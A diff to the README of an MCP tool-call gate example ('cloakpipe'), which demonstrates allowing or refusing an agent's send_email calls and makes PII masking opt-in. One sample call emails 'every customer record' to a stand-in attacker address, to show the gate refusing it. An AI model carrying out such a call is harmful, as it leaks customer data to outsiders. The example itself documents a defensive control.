@@ -31,9 +31,6 @@ From the repository root:
 cargo build -p cloakpipe-cli
 cd examples/support-agent
 
-# mcp-proxy still pseudonymises PII in forwarded arguments, which needs a vault key.
-export CLOAKPIPE_VAULT_KEY=$(openssl rand -hex 32)
-
 printf '%s\n' \
   '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"dana@customer.example","subject":"Your refund","body":"Your refund for T-1042 is on its way."}}}' \
   '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"attacker@evil.example","subject":"Customer list","body":"Attached: every customer record."}}}' \
@@ -68,7 +65,7 @@ The email to the customer on the ticket (id 1) is forwarded, and only that one
 reaches the tool server (its log line is on stderr):
 
 ```text
-upstream received: send_email {"body": "Your refund for T-1042 is on its way.", "subject": "Your refund", "to": "EMAIL_1"}
+upstream received: send_email {"body": "Your refund for T-1042 is on its way.", "subject": "Your refund", "to": "dana@customer.example"}
 {"id":1,"jsonrpc":"2.0","result":{"content":[{"text":"send_email: done","type":"text"}]}}
 ```
 
@@ -76,10 +73,11 @@ Refusals are answered at once, so they can print before the forwarded call's
 result. The `release` value is the hash of `release.yaml`; it changes if you
 edit that file.
 
-Note `"to": "EMAIL_1"`: this version of `mcp-proxy` still replaces PII in
-forwarded arguments with pseudonyms (and puts the real values back in
-results). The contract is checked on the raw arguments before that happens.
-Forwarding raw arguments by default, with masking as an opt-in, is planned.
+The allowed call reaches the tool exactly as the agent sent it: the gate
+allows or refuses, and never rewrites an allowed call. To have PII in
+forwarded arguments replaced with pseudonyms (and the real values put back in
+results), add `--transform pii` and set `CLOAKPIPE_VAULT_KEY`; the contract
+is still checked on the raw arguments.
 
 ## What to try
 
